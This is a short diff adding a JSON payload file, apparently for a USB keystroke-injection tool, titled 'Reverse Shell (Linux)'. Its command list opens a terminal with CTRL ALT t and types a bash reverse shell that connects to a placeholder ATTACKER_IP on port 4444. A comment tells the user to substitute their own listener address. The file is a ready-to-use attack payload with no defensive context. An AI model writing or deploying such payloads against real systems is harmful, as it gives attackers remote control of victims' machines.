@@ -1,0 +1,15 @@
+{
+    "name": "Reverse Shell (Linux)",
+    "description": "Opens a reverse shell connection on Linux systems",
+    "target_os": "linux",
+    "delay_ms": 100,
+    "commands": [
+        "REM Reverse shell payload for Linux",
+        "REM Replace IP and PORT with your listener",
+        "DELAY 1000",
+        "CTRL ALT t",
+        "DELAY 1000",
+        "STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
+        "ENTER"
+    ]
+}
